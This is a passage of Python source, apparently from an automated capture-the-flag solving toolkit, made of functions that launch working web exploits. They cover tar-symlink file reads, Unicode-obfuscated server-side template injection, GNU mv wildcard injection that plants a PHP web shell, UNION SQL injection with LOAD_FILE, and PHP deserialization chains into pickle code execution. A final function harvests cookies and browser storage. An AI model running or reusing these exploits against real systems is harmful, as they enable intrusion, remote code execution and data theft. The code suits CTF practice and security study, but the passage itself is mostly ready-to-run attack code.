            "filename": filename,
            "http_status": getattr(upload_response, "status_code", None),
            "payload_bytes": len(payload),
            "stored_hint": _extract_upload_storage_hint(upload_text),
            "flag_candidates": _extract_flag_candidates(upload_text),
            "snippet": upload_text,
        })

        include_response = http.get(
            include_url,
            params={file_param: filename},
            timeout=timeout_seconds,
        )
        include_text = _sanitize_text(getattr(include_response, "text", ""), 4000)
        attempts.append({
            "step": "include",
            "url": include_url,
            "params": {file_param: filename},
            "http_status": getattr(include_response, "status_code", None),
            "flag_candidates": _extract_flag_candidates(include_text),
            "success_indicators": _success_indicators(include_text),
            "snippet": include_text,
        })

        summary = {
            "status": "attack_complete",
            "strategy": "phar_gzip_png",
            "base_url": base_root.rstrip("/"),
            "upload_url": upload_url,
            "include_url": include_url,
            "filename": filename,
            "attempts": attempts,
            "flag_candidates": list(dict.fromkeys(candidate for item in attempts for candidate in item.get("flag_candidates", []))),
        }
        return _sanitize_text(json.dumps(summary, ensure_ascii=False, indent=2), 18000)
    except Exception as e:
        return f"Browser attack upload/include error: {e}"


def browser_attack_tar_symlink_read(
    base_url: str = "",
    upload_path: str = "/",
    download_template: str = "/download/{name}",
    file_field: str = "file",
    link_name: str = "flag_link.txt",
    target_path: str = "/flag",
    timeout_ms: int = 8000,
) -> str:
    """Exploit tar auto-extract file shares that serve extracted symlinks."""
    session = get_session()
    try:
        import io
        import tarfile

        session.ensure_browser()
        page = session.page
        target_base = _prefer_last_instance_url(base_url or page.url or "").rstrip("/")
        if not target_base:
            return json.dumps({"status": "error", "error": "missing base_url"}, ensure_ascii=False)

        timeout = max(1000, min(int(timeout_ms or 8000), 30000))
        clean_link_name = (link_name or "flag_link.txt").lstrip("/").replace("\\", "/")
        if ".." in clean_link_name.split("/"):
            clean_link_name = "flag_link.txt"
        target = target_path or "/flag"

        tar_buffer = io.BytesIO()
        with tarfile.open(fileobj=tar_buffer, mode="w") as archive:
            info = tarfile.TarInfo(clean_link_name)
            info.type = tarfile.SYMTYPE
            info.linkname = target
            info.mode = 0o777
            archive.addfile(info)
        tar_bytes = tar_buffer.getvalue()

        upload_url = urljoin(target_base + "/", upload_path.lstrip("/"))
        request = getattr(getattr(page, "context", None), "request", None)
        upload_status = 0
        upload_preview = ""
        if request:
            upload_response = request.post(
                upload_url,
                multipart={
                    file_field: {
                        "name": "codex_symlink.tar",
                        "mimeType": "application/x-tar",
                        "buffer": tar_bytes,
                    }
                },
                timeout=timeout,
            )
            upload_status = int(getattr(upload_response, "status", 0) or 0)
            try:
                upload_preview = _sanitize_text(upload_response.text(), 600)
            except Exception:
                upload_preview = ""
        else:
            import requests

            upload_response = requests.post(
                upload_url,
                files={file_field: ("codex_symlink.tar", tar_bytes, "application/x-tar")},
                timeout=timeout / 1000,
            )
            upload_status = int(upload_response.status_code)
            upload_preview = _sanitize_text(upload_response.text, 600)

        download_path = (download_template or "/download/{name}").format(name=clean_link_name)
        download_url = urljoin(target_base + "/", download_path.lstrip("/"))
        if request:
            download_response = request.get(download_url, timeout=timeout)
            download_status = int(getattr(download_response, "status", 0) or 0)
            download_text = download_response.text()
        else:
            import requests

            download_response = requests.get(download_url, timeout=timeout / 1000)
            download_status = int(download_response.status_code)
            download_text = download_response.text

        flag_candidates = _extract_flag_candidates(download_text)
        result = {
            "status": "flag_found" if flag_candidates else "attack_complete",
            "strategy": "tar_symlink_file_read",
            "base_url": target_base,
            "upload_url": upload_url,
            "download_url": download_url,
            "file_field": file_field,
            "link_name": clean_link_name,
            "target_path": target,
            "upload_status": upload_status,
            "upload_preview": upload_preview,
            "download_status": download_status,
            "download_preview": _sanitize_text(download_text, 800),
            "flag_candidates": flag_candidates,
        }
        return _sanitize_text(json.dumps(result, ensure_ascii=False, indent=2, default=str), 12000)
    except Exception as e:
        return f"Tar symlink read attack error: {e}"


def browser_attack_bottle_unicode_ssti_zip(
    base_url: str = "",
    upload_path: str = "/upload",
    file_field: str = "file",
    filename: str = "a.txt",
    flag_path: str = "/flag",
    timeout_ms: int = 8000,
) -> str:
    """Exploit Bottle zip viewers that render extracted file content as a template."""
    session = get_session()
    try:
        import io
        import zipfile
        import requests

        session.ensure_browser()
        page = session.page
        target_base = _prefer_last_instance_url(base_url or page.url or "").rstrip("/")
        if not target_base:
            return json.dumps({"status": "error", "error": "missing base_url"}, ensure_ascii=False)
        if not target_base.startswith(("http://", "https://")):
            target_base = urljoin(page.url.rstrip("/") + "/", target_base.lstrip("/")).rstrip("/")

        timeout_seconds = max(1.0, min(float(timeout_ms or 8000) / 1000.0, 30.0))
        clean_filename = re.sub(r"[^A-Za-z0-9_.-]", "_", filename or "a.txt").strip(".") or "a.txt"
        if "/" in clean_filename or "\\" in clean_filename:
            clean_filename = "a.txt"
        safe_flag_path = flag_path or "/flag"
        payload = "{{" + "\uff4f\uff50\uff45\uff4e" + f"('{safe_flag_path}')." + "\uff52\uff45\uff41\uff44" + "()}}"

        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, "w", compression=zipfile.ZIP_DEFLATED) as archive:
            archive.writestr(clean_filename, payload)
        zip_bytes = zip_buffer.getvalue()

        http = requests.Session()
        http.trust_env = False
        try:
            if getattr(page, "context", None) and hasattr(page.context, "cookies"):
                cookie_domain = urlparse(target_base).hostname
                for cookie in page.context.cookies(target_base):
                    if cookie.get("name"):
                        http.cookies.set(cookie.get("name", ""), cookie.get("value", ""), domain=cookie_domain)
        except Exception:
            pass

        upload_url = urljoin(target_base + "/", (upload_path or "/upload").lstrip("/"))
        attempts: list[dict[str, Any]] = []
        flag_candidates: list[str] = []

        upload_response = http.post(
            upload_url,
            files={file_field or "file": ("codex_bottle_ssti.zip", zip_bytes, "application/zip")},
            timeout=timeout_seconds,
        )
        upload_text = getattr(upload_response, "text", "")
        attempts.append({
            "step": "upload_zip_template_payload",
            "url": upload_url,
            "http_status": getattr(upload_response, "status_code", None),
            "filename": clean_filename,
            "payload_unicode_escape": payload.encode("unicode_escape").decode("ascii"),
            "snippet": _sanitize_text(upload_text, 1200),
            "flag_candidates": _extract_flag_candidates(upload_text),
        })
        flag_candidates.extend(attempts[-1]["flag_candidates"])

        view_urls: list[str] = []
        location = getattr(upload_response, "headers", {}).get("Location", "")
        if location:
            view_urls.append(urljoin(upload_url, location))
        for match in re.findall(r'href=["\']([^"\']*/view/[^"\']+)["\']', upload_text, re.IGNORECASE):
            view_urls.append(urljoin(target_base + "/", html.unescape(match)))
        for match in re.findall(r'["\'](/view/[^"\']+)["\']', upload_text, re.IGNORECASE):
            view_urls.append(urljoin(target_base + "/", html.unescape(match)))
        if not view_urls:
            dir_match = re.search(r"/view/([A-Za-z0-9_-]{4,64})/", upload_text)
            if dir_match:
                view_urls.append(urljoin(target_base + "/", f"/view/{dir_match.group(1)}/{clean_filename}"))

        seen_urls: set[str] = set()
        for view_url in view_urls[:8]:
            if view_url in seen_urls:
                continue
            seen_urls.add(view_url)
            response = http.get(view_url, timeout=timeout_seconds)
            text = getattr(response, "text", "")
            candidates = _extract_flag_candidates(text)
            attempts.append({
                "step": "render_uploaded_template",
                "url": view_url,
                "http_status": getattr(response, "status_code", None),
                "snippet": _sanitize_text(text, 1600),
                "flag_candidates": candidates,
            })
            flag_candidates.extend(candidates)
            if candidates:
                break

        unique_flags = list(dict.fromkeys(flag_candidates))
        result = {
            "status": "flag_found" if unique_flags else "attack_complete",
            "strategy": "bottle_unicode_normalized_ssti_zip",
            "base_url": target_base,
            "upload_url": upload_url,
            "file_field": file_field or "file",
            "filename": clean_filename,
            "flag_path": safe_flag_path,
            "payload_unicode_escape": payload.encode("unicode_escape").decode("ascii"),
            "view_urls": list(seen_urls),
            "attempts": attempts,
            "flag_candidates": unique_flags,
        }
        return _sanitize_text(json.dumps(result, ensure_ascii=False, indent=2, default=str), 18000)
    except Exception as e:
        return f"Bottle Unicode SSTI zip attack error: {e}"


def browser_attack_mv_wildcard_backup(
    base_url: str = "",
    upload_path: str = "/",
    shell_stem: str = "shell",
    timeout_ms: int = 8000,
) -> str:
    """Exploit PHP upload flows that run `mv * target` via GNU mv option injection."""
    session = get_session()
    try:
        session.ensure_browser()
        page = session.page
        target_base = _prefer_last_instance_url(base_url or page.url or "").rstrip("/")
        if not target_base:
            return json.dumps({"status": "error", "error": "missing base_url"}, ensure_ascii=False)
        timeout_seconds = max(1.0, min(float(timeout_ms or 8000) / 1000.0, 30.0))

        import requests

        http = requests.Session()
        try:
            if getattr(page, "context", None) and hasattr(page.context, "cookies"):
                cookie_domain = urlparse(target_base).hostname
                for cookie in page.context.cookies(target_base):
                    if cookie.get("name"):
                        http.cookies.set(cookie.get("name", ""), cookie.get("value", ""), domain=cookie_domain)
        except Exception:
            pass

        upload_url = urljoin(target_base + "/", upload_path.lstrip("/"))
        clean_stem = re.sub(r"[^A-Za-z0-9_.-]", "_", shell_stem or "shell").strip(".") or "shell"
        if sorted(["-S", "php", f"{clean_stem}."])[1] != "php":
            clean_stem = f"shell_{clean_stem}"
        shell_seed_name = f"{clean_stem}."
        shell_path = f"/upload/{clean_stem}.php"
        php_payload = b'<?php echo "START\\n"; system("cat /flag"); echo "\\nEND"; ?>'
        attempts: list[dict[str, Any]] = []

        def post_form(data: dict[str, str], files: list[tuple[str, tuple[str, bytes, str]]] | None = None) -> Any:
            return http.post(upload_url, data=data, files=files or [], timeout=timeout_seconds)

        # Flush stale /tmp/upload entries if the app has any from previous probes.
        try:
            cleanup = post_form({"confirm_move": "1"})
            attempts.append({
                "step": "pre_confirm_move",
                "http_status": getattr(cleanup, "status_code", None),
                "snippet": _sanitize_text(getattr(cleanup, "text", ""), 500),
            })
        except Exception as exc:
            attempts.append({"step": "pre_confirm_move", "error": _sanitize_text(exc, 200)})

        stage1_upload = post_form(
            {"upload": "1"},
            [("files[]", (shell_seed_name, php_payload, "image/jpeg"))],
        )
        attempts.append({
            "step": "stage1_upload_php_payload_as_extensionless_file",
            "filename": shell_seed_name,
            "http_status": getattr(stage1_upload, "status_code", None),
            "snippet": _sanitize_text(getattr(stage1_upload, "text", ""), 800),
            "flag_candidates": _extract_flag_candidates(getattr(stage1_upload, "text", "")),
        })

        stage1_move = post_form({"confirm_move": "1"})
        attempts.append({
            "step": "stage1_move_seed_to_upload_dir",
            "http_status": getattr(stage1_move, "status_code", None),
            "snippet": _sanitize_text(getattr(stage1_move, "text", ""), 800),
            "flag_candidates": _extract_flag_candidates(getattr(stage1_move, "text", "")),
        })

        stage2_upload = post_form(
            {"upload": "1"},
            [
                ("files[]", ("--backup", b"x", "text/plain")),
                ("files[]", ("-S", b"x", "text/plain")),
                ("files[]", ("php", b"x", "text/plain")),
                ("files[]", (shell_seed_name, b"overwrite", "image/jpeg")),
            ],
        )
        attempts.append({
            "step": "stage2_upload_mv_options_and_collision",
            "filenames": ["--backup", "-S", "php", shell_seed_name],
            "http_status": getattr(stage2_upload, "status_code", None),
            "snippet": _sanitize_text(getattr(stage2_upload, "text", ""), 800),
            "flag_candidates": _extract_flag_candidates(getattr(stage2_upload, "text", "")),
        })

        stage2_move = post_form({"confirm_move": "1"})
        attempts.append({
            "step": "stage2_trigger_mv_backup_suffix_php",
            "http_status": getattr(stage2_move, "status_code", None),
            "snippet": _sanitize_text(getattr(stage2_move, "text", ""), 800),
            "flag_candidates": _extract_flag_candidates(getattr(stage2_move, "text", "")),
        })

        shell_url = urljoin(target_base + "/", shell_path.lstrip("/"))
        shell_response = http.get(shell_url, timeout=timeout_seconds)
        shell_text = getattr(shell_response, "text", "")
        attempts.append({
            "step": "trigger_backup_php_shell",
            "url": shell_url,
            "http_status": getattr(shell_response, "status_code", None),
            "snippet": _sanitize_text(shell_text, 1200),
            "flag_candidates": _extract_flag_candidates(shell_text),
        })

        flag_candidates = list(dict.fromkeys(
            candidate
            for item in attempts
            for candidate in item.get("flag_candidates", [])
        ))
        result = {
            "status": "flag_found" if flag_candidates else "attack_complete",
            "strategy": "gnu_mv_wildcard_backup_suffix_php",
            "base_url": target_base,
            "upload_url": upload_url,
            "shell_seed_name": shell_seed_name,
            "shell_path": shell_path,
            "attempts": attempts,
            "flag_candidates": flag_candidates,
        }
        return _sanitize_text(json.dumps(result, ensure_ascii=False, indent=2, default=str), 18000)
    except Exception as e:
        return f"MV wildcard backup attack error: {e}"


def browser_attack_php_noticeboard_sqli_loadfile(
    base_url: str = "",
    admin_email: str = "admin@gmail.com",
    admin_password: str = "admin",
    login_path: str = "/admin/login.php",
    update_path: str = "/admin/index.php",
    timeout_ms: int = 8000,
) -> str:
    """Exploit Online Notice Board style admin SQLi by UNION-reading LOAD_FILE('/flag')."""
    session = get_session()
    try:
        session.ensure_browser()
        page = session.page
        target_base = _prefer_last_instance_url(base_url or page.url or "").rstrip("/")
        if not target_base:
            return json.dumps({"status": "error", "error": "missing base_url"}, ensure_ascii=False)
        if not target_base.startswith(("http://", "https://")):
            target_base = urljoin(page.url.rstrip("/") + "/", target_base.lstrip("/")).rstrip("/")

        import requests

        timeout_seconds = max(1.0, min(float(timeout_ms or 8000) / 1000.0, 30.0))
        http = requests.Session()
        try:
            if getattr(page, "context", None) and hasattr(page.context, "cookies"):
                cookie_domain = urlparse(target_base).hostname
                for cookie in page.context.cookies(target_base):
                    if cookie.get("name"):
                        http.cookies.set(cookie.get("name", ""), cookie.get("value", ""), domain=cookie_domain)
        except Exception:
            pass

        login_url = urljoin(target_base + "/", login_path.lstrip("/"))
        update_url = urljoin(target_base + "/", update_path.lstrip("/"))
        attempts: list[dict[str, Any]] = []

        login_response = http.post(
            login_url,
            data={
                "email": admin_email or "admin@gmail.com",
                "pass": admin_password or "admin",
                "login": "Login",
            },
            timeout=timeout_seconds,
            allow_redirects=False,
        )
        attempts.append({
            "step": "admin_login",
            "url": login_url,
            "email": admin_email or "admin@gmail.com",
            "http_status": getattr(login_response, "status_code", None),
            "location": getattr(login_response, "headers", {}).get("Location", ""),
            "snippet": _sanitize_text(getattr(login_response, "text", ""), 600),
        })

        def extract_subject(response_text: str) -> str:
            patterns = [
                r'name=["\']sub["\'][^>]*value=["\']([^"\']*)["\']',
                r'value=["\']([^"\']*)["\'][^>]*name=["\']sub["\']',
                r'<textarea[^>]*name=["\']details["\'][^>]*>(.*?)</textarea>',
            ]
            for pattern in patterns:
                match = re.search(pattern, response_text, re.IGNORECASE | re.DOTALL)
                if match:
                    return html.unescape(match.group(1).strip())
            return ""

        def union_subject(expr: str, label: str) -> dict[str, Any]:
            payload = f"-1' union select 1,2,{expr},4,5-- -"
            response = http.get(
                update_url,
                params={"page": "update_notice", "notice_id": payload},
                timeout=timeout_seconds,
            )
            text = getattr(response, "text", "")
            value = extract_subject(text)
            return {
                "step": label,
                "url": update_url,
                "payload": payload,
                "http_status": getattr(response, "status_code", None),
                "value": value,
                "snippet": _sanitize_text(text, 800),
                "flag_candidates": _extract_flag_candidates(value + "\n" + text),
            }

        tables_attempt = union_subject(
            "(select group_concat(table_name separator 0x7c) from information_schema.tables where table_schema=database())",
            "union_list_tables",
        )
        attempts.append(tables_attempt)
        columns_attempt = union_subject(
            "(select group_concat(table_name,0x3a,column_name separator 0x7c) from information_schema.columns where table_schema=database())",
            "union_list_columns",
        )
        attempts.append(columns_attempt)

        file_paths = ["/flag", "/home/flag", "/flag.txt", "/home/ctf/flag", "/var/www/html/flag"]
        decoded_files: dict[str, str] = {}
        for path in file_paths:
            attempt = union_subject(f"hex(load_file('{path}'))", f"load_file_hex_{path}")
            raw_hex = re.sub(r"[^0-9a-fA-F]", "", attempt.get("value", ""))
            decoded = ""
            if raw_hex and len(raw_hex) % 2 == 0:
                try:
                    decoded = bytes.fromhex(raw_hex).decode("utf-8", "replace")
                except ValueError:
                    decoded = ""
            if decoded:
                decoded_files[path] = decoded
            attempt["decoded"] = _sanitize_text(decoded, 1000)
            attempt["flag_candidates"] = list(dict.fromkeys(
                list(attempt.get("flag_candidates", []))
                + _extract_flag_candidates(decoded)
            ))
            attempts.append(attempt)
            if attempt["flag_candidates"]:
                break

        flag_candidates = list(dict.fromkeys(
            candidate
            for item in attempts
            for candidate in item.get("flag_candidates", [])
        ))
        result = {
            "status": "flag_found" if flag_candidates else "attack_complete",
            "strategy": "online_notice_board_union_load_file",
            "base_url": target_base,
            "login_url": login_url,
            "update_url": update_url,
            "admin_email": admin_email or "admin@gmail.com",
            "tables": tables_attempt.get("value", ""),
            "columns": columns_attempt.get("value", ""),
            "decoded_files": decoded_files,
            "attempts": attempts,
            "flag_candidates": flag_candidates,
        }
        return _sanitize_text(json.dumps(result, ensure_ascii=False, indent=2, default=str), 18000)
    except Exception as e:
        return f"Notice board SQLi load_file attack error: {e}"


def browser_attack_php_sharkhub_unserialize_file_read(
    base_url: str = "",
    post_param: str = "shark",
    api_path: str = "/api.php",
    flag_url: str = "file:///flag",
    timeout_ms: int = 8000,
) -> str:
    """Exploit SharkHub/ez_unserialize: store a ShitMountant object then fetch it via api.php."""
    session = get_session()
    try:
        session.ensure_browser()
        page = session.page
        target_base = _prefer_last_instance_url(base_url or page.url or "").rstrip("/")
        if not target_base:
            return json.dumps({"status": "error", "error": "missing base_url"}, ensure_ascii=False)
        if not target_base.startswith(("http://", "https://")):
            target_base = urljoin(page.url.rstrip("/") + "/", target_base.lstrip("/")).rstrip("/")

        import requests

        timeout_seconds = max(1.0, min(float(timeout_ms or 8000) / 1000.0, 30.0))
        http = requests.Session()
        try:
            if getattr(page, "context", None) and hasattr(page.context, "cookies"):
                cookie_domain = urlparse(target_base).hostname
                for cookie in page.context.cookies(target_base):
                    if cookie.get("name"):
                        http.cookies.set(cookie.get("name", ""), cookie.get("value", ""), domain=cookie_domain)
        except Exception:
            pass

        class_name = "ShitMountant"
        flag_url = flag_url or "file:///flag"
        payload = (
            f'O:{len(class_name)}:"{class_name}":2:'
            f'{{s:3:"url";s:{len(flag_url)}:"{flag_url}";s:6:"logger";N;}}'
        )
        root_url = target_base + "/"
        attempts: list[dict[str, Any]] = []
        flag_candidates: list[str] = []

        try:
            root_before = http.get(root_url, timeout=timeout_seconds)
            attempts.append({
                "step": "fetch_root_before",
                "url": root_url,
                "http_status": getattr(root_before, "status_code", None),
                "snippet": _sanitize_text(getattr(root_before, "text", ""), 1000),
                "flag_candidates": _extract_flag_candidates(getattr(root_before, "text", "")),
            })
            flag_candidates.extend(attempts[-1]["flag_candidates"])
        except Exception as exc:
            attempts.append({"step": "fetch_root_before", "url": root_url, "error": str(exc)[:300]})

        post_response = http.post(
            root_url,
            data={post_param or "shark": "blueshark:" + payload},
            timeout=timeout_seconds,
        )
        attempts.append({
            "step": "store_serialized_object",
            "url": root_url,
            "param": post_param or "shark",
            "payload": payload,
            "http_status": getattr(post_response, "status_code", None),
            "snippet": _sanitize_text(getattr(post_response, "text", ""), 1000),
            "flag_candidates": _extract_flag_candidates(getattr(post_response, "text", "")),
        })
        flag_candidates.extend(attempts[-1]["flag_candidates"])

        latest_ids: list[str] = []
        try:
            root_after = http.get(root_url, timeout=timeout_seconds)
            text_after = getattr(root_after, "text", "")
            latest_ids = re.findall(r'<div[^>]+class=["\']meta["\'][^>]*>\s*#?(\d+)\s*</div>', text_after, re.I)
            if not latest_ids:
                latest_ids = re.findall(r'#\s*(\d+)', text_after)
            attempts.append({
                "step": "fetch_root_after",
                "url": root_url,
                "http_status": getattr(root_after, "status_code", None),
                "latest_ids": latest_ids[:5],
                "snippet": _sanitize_text(text_after, 1200),
                "flag_candidates": _extract_flag_candidates(text_after),
            })
            flag_candidates.extend(attempts[-1]["flag_candidates"])
        except Exception as exc:
            attempts.append({"step": "fetch_root_after", "url": root_url, "error": str(exc)[:300]})

        api_url = urljoin(target_base + "/", (api_path or "/api.php").lstrip("/"))
        candidate_ids = list(dict.fromkeys([*latest_ids[:5], "1", "2", "3", "4", "5"]))
        for note_id in candidate_ids:
            try:
                response = http.get(api_url, params={"id": note_id}, timeout=timeout_seconds)
                text = getattr(response, "text", "")
                candidates = _extract_flag_candidates(text)
                attempts.append({
                    "step": "trigger_unserialize_fetch",
                    "url": api_url,
                    "id": note_id,
                    "http_status": getattr(response, "status_code", None),
                    "snippet": _sanitize_text(text, 1400),
                    "flag_candidates": candidates,
                })
                flag_candidates.extend(candidates)
                if candidates:
                    break
            except Exception as exc:
                attempts.append({
                    "step": "trigger_unserialize_fetch",
                    "url": api_url,
                    "id": note_id,
                    "error": str(exc)[:300],
                })

        unique_flags = list(dict.fromkeys(flag_candidates))
        result = {
            "status": "flag_found" if unique_flags else "attack_complete",
            "strategy": "sharkhub_shitmountant_file_get_contents",
            "base_url": target_base,
            "post_param": post_param or "shark",
            "api_path": api_path or "/api.php",
            "flag_url": flag_url,
            "payload": payload,
            "attempts": attempts,
            "flag_candidates": unique_flags,
        }
        return _sanitize_text(json.dumps(result, ensure_ascii=False, indent=2, default=str), 18000)
    except Exception as e:
        return f"SharkHub unserialize file-read attack error: {e}"


def browser_attack_php_ssxl_pickle_bridge(
    base_url: str = "",
    post_param: str = "s",
    api_path: str = "/api.php",
    run_path: str = "/run.php",
    flag_path: str = "/flag",
    timeout_ms: int = 8000,
) -> str:
    """Exploit ssxl: PHP Bridge/Writer/Shark object chain into Pytools pickle execution."""
    session = get_session()
    try:
        session.ensure_browser()
        page = session.page
        target_base = _prefer_last_instance_url(base_url or page.url or "").rstrip("/")
        if not target_base:
            return json.dumps({"status": "error", "error": "missing base_url"}, ensure_ascii=False)
        if not target_base.startswith(("http://", "https://")):
            target_base = urljoin(page.url.rstrip("/") + "/", target_base.lstrip("/")).rstrip("/")

        import requests

        timeout_seconds = max(1.0, min(float(timeout_ms or 8000) / 1000.0, 30.0))
        http = requests.Session()
        try:
            if getattr(page, "context", None) and hasattr(page.context, "cookies"):
                cookie_domain = urlparse(target_base).hostname
                for cookie in page.context.cookies(target_base):
                    if cookie.get("name"):
                        http.cookies.set(cookie.get("name", ""), cookie.get("value", ""), domain=cookie_domain)
        except Exception:
            pass

        raw_pickle = _build_ssxl_set_pickle(flag_path or "/flag")
        b64data = base64.b64encode(raw_pickle).decode("ascii")
        pytools_payload = 'O:7:"Pytools":0:{}'
        php_payload = _build_ssxl_php_bridge_payload(b64data, pytools_payload)

        root_url = target_base + "/"
        api_url = urljoin(target_base + "/", (api_path or "/api.php").lstrip("/"))
        run_url = urljoin(target_base + "/", (run_path or "/run.php").lstrip("/"))
        attempts: list[dict[str, Any]] = []
        flag_candidates: list[str] = []

        try:
            root_before = http.get(root_url, timeout=timeout_seconds)
            attempts.append({
                "step": "fetch_root_before",
                "url": root_url,
                "http_status": getattr(root_before, "status_code", None),
                "snippet": _sanitize_text(getattr(root_before, "text", ""), 1000),
                "flag_candidates": _extract_flag_candidates(getattr(root_before, "text", "")),
            })
            flag_candidates.extend(attempts[-1]["flag_candidates"])
        except Exception as exc:
            attempts.append({"step": "fetch_root_before", "url": root_url, "error": str(exc)[:300]})

        post_response = http.post(
            root_url,
            data={post_param or "s": "blueshark:" + php_payload},
            timeout=timeout_seconds,
        )
        attempts.append({
            "step": "store_bridge_payload",
            "url": root_url,
            "param": post_param or "s",
            "http_status": getattr(post_response, "status_code", None),
            "snippet": _sanitize_text(getattr(post_response, "text", ""), 1000),
            "flag_candidates": _extract_flag_candidates(getattr(post_response, "text", "")),
        })
        flag_candidates.extend(attempts[-1]["flag_candidates"])

        latest_ids: list[str] = []
        try:
            root_after = http.get(root_url, timeout=timeout_seconds)
            text_after = getattr(root_after, "text", "")
            latest_ids = re.findall(r'<div[^>]+class=["\']meta["\'][^>]*>\s*#?(\d+)\s*</div>', text_after, re.I)
            if not latest_ids:
                latest_ids = re.findall(r'#\s*(\d+)', text_after)
            attempts.append({
                "step": "fetch_root_after",
                "url": root_url,
                "http_status": getattr(root_after, "status_code", None),
                "latest_ids": latest_ids[:10],
                "snippet": _sanitize_text(text_after, 1200),
                "flag_candidates": _extract_flag_candidates(text_after),
            })
            flag_candidates.extend(attempts[-1]["flag_candidates"])
        except Exception as exc:
            attempts.append({"step": "fetch_root_after", "url": root_url, "error": str(exc)[:300]})

        candidate_ids = list(dict.fromkeys([*latest_ids[:10], *[str(i) for i in range(1, 16)]]))
        for note_id in candidate_ids:
            try:
                response = http.get(api_url, params={"id": note_id}, timeout=timeout_seconds)
                text = getattr(response, "text", "")
                candidates = _extract_flag_candidates(text)
                attempts.append({
                    "step": "trigger_php_bridge",
                    "url": api_url,
                    "id": note_id,
                    "http_status": getattr(response, "status_code", None),
                    "snippet": _sanitize_text(text, 1200),
                    "flag_candidates": candidates,
                })
                flag_candidates.extend(candidates)
                run_response = http.get(run_url, params={"action": "run"}, timeout=timeout_seconds)
                run_text = getattr(run_response, "text", "")
                run_candidates = _extract_flag_candidates(run_text)
                attempts.append({
                    "step": "trigger_pytools_pickle",
                    "url": run_url,
                    "id": note_id,
                    "http_status": getattr(run_response, "status_code", None),
                    "snippet": _sanitize_text(run_text, 2400),
                    "flag_candidates": run_candidates,
                })
                flag_candidates.extend(run_candidates)
                if run_candidates:
                    break
            except Exception as exc:
                attempts.append({
                    "step": "trigger_chain",
                    "url": api_url,
                    "id": note_id,
                    "error": str(exc)[:300],
                })

        unique_flags = list(dict.fromkeys(flag_candidates))
        result = {
            "status": "flag_found" if unique_flags else "attack_complete",
            "strategy": "php_ssxl_bridge_to_python_pickle",
            "base_url": target_base,
            "post_param": post_param or "s",
            "api_path": api_path or "/api.php",
            "run_path": run_path or "/run.php",
            "php_payload": php_payload,
            "pickle_b64_len": len(b64data),
            "attempts": attempts,
            "flag_candidates": unique_flags,
        }
        return _sanitize_text(json.dumps(result, ensure_ascii=False, indent=2, default=str), 18000)
    except Exception as e:
        return f"ssxl PHP/pickle bridge attack error: {e}"


def browser_attack_php_unserialize(
    base_url: str = "",
    param: str = "exp",
    command: str = "/usr/b??/?l /?lag",
    timeout_ms: int = 8000,
) -> str:
    """Exploit the common FLAG/create_function unserialize pattern."""
    session = get_session()
    try:
        session.ensure_browser()
        page = session.page
        target = _prefer_last_instance_url(base_url or page.url or "")
        if not target:
            return json.dumps({"status": "error", "error": "missing base_url"}, ensure_ascii=False)
        if not target.startswith(("http://", "https://")):
            target = urljoin(page.url.rstrip("/") + "/", target.lstrip("/"))

        payload = _build_php_flag_unserialize_payload(command)
        url = _url_with_query_param(target, param or "exp", payload)
        timeout = max(1000, min(int(timeout_ms or 8000), 20000))
        attempts: list[dict[str, Any]] = []
        response = page.context.request.get(url, timeout=timeout)
        content_type = response.headers.get("content-type", "")
        text = ""
        if _looks_textual(content_type):
            text = response.text()
        snippet = _sanitize_text(text, 4000)
        attempts.append({
            "url": url,
            "param": param or "exp",
            "payload": payload,
            "http_status": response.status,
            "content_type": content_type,
            "flag_candidates": _extract_flag_candidates(text),
            "success_indicators": _success_indicators(snippet),
            "snippet": snippet,
        })
        flag_candidates = list(dict.fromkeys(candidate for item in attempts for candidate in item.get("flag_candidates", [])))
        return _sanitize_text(json.dumps({
            "status": "flag_found" if flag_candidates else "attack_complete",
            "strategy": "flag_create_function",
            "base_url": target,
            "param": param or "exp",
            "attempts": attempts,
            "flag_candidates": flag_candidates,
        }, ensure_ascii=False, indent=2), 18000)
    except Exception as e:
        return f"Browser attack php unserialize error: {e}"


def browser_attack_php_ezpop_chain(
    base_url: str = "",
    param: str = "ISCTF",
    command: str = 'echo(file_get_contents(glob("/?lag")[0]));',
    magic_value: str = "213",
    timeout_ms: int = 8000,
) -> str:
    """Exploit the ezpop public-property POP chain with POST unserialize."""
    session = get_session()
    try:
        session.ensure_browser()
        page = session.page
        target = _prefer_last_instance_url(base_url or page.url or "").rstrip("/")
        if not target:
            return json.dumps({"status": "error", "error": "missing base_url"}, ensure_ascii=False)
        if not target.startswith(("http://", "https://")):
            target = urljoin(page.url.rstrip("/") + "/", target.lstrip("/"))

        import requests

        timeout_seconds = max(1.0, min(float(timeout_ms or 8000) / 1000.0, 30.0))
        http = requests.Session()
        try:
            if getattr(page, "context", None) and hasattr(page.context, "cookies"):
                cookie_domain = urlparse(target).hostname
                for cookie in page.context.cookies(target):
                    if cookie.get("name"):
                        http.cookies.set(cookie.get("name", ""), cookie.get("value", ""), domain=cookie_domain)
        except Exception:
            pass

        payload = _build_php_ezpop_payload(command=command, magic_value=magic_value)
        response = http.post(target + "/", data={param or "ISCTF": payload}, timeout=timeout_seconds)
        text = getattr(response, "text", "")
        flag_candidates = _extract_flag_candidates(text)
        result = {
            "status": "flag_found" if flag_candidates else "attack_complete",
            "strategy": "ezpop_public_property_chain",
            "base_url": target,
            "param": param or "ISCTF",
            "payload": payload,
            "command": command,
            "magic_value": magic_value,
            "http_status": getattr(response, "status_code", None),
            "snippet": _sanitize_text(text, 2000),
            "flag_candidates": flag_candidates,
        }
        return _sanitize_text(json.dumps(result, ensure_ascii=False, indent=2, default=str), 14000)
    except Exception as e:
        return f"Browser attack php ezpop chain error: {e}"


def browser_collect_artifacts(max_script_chars: int = 2000) -> str:
    """Collect DOM, storage, script, endpoint, and flag clues from the current page."""
    session = get_session()
    try:
        session.ensure_browser()
        page = session.page
        max_chars = max(500, min(int(max_script_chars or 2000), 8000))
        dom = page.evaluate(r"""() => {
            const comments = [];
            const walker = document.createTreeWalker(document.documentElement, NodeFilter.SHOW_COMMENT);
            while (comments.length < 40) {
                const node = walker.nextNode();
                if (!node) break;
                comments.push(node.nodeValue.trim().substring(0, 300));
            }
            const readStorage = (storage) => {
                const out = {};
                try {
                    for (let i = 0; i < storage.length && i < 80; i++) {
                        const key = storage.key(i);
                        out[key] = String(storage.getItem(key)).substring(0, 500);
                    }
                } catch (e) {
                    out.__error__ = String(e).substring(0, 200);
                }
                return out;
            };
            return {
                url: location.href,
                title: document.title,
                comments,
                cookies: document.cookie || '',
                local_storage: readStorage(localStorage),
                session_storage: readStorage(sessionStorage),
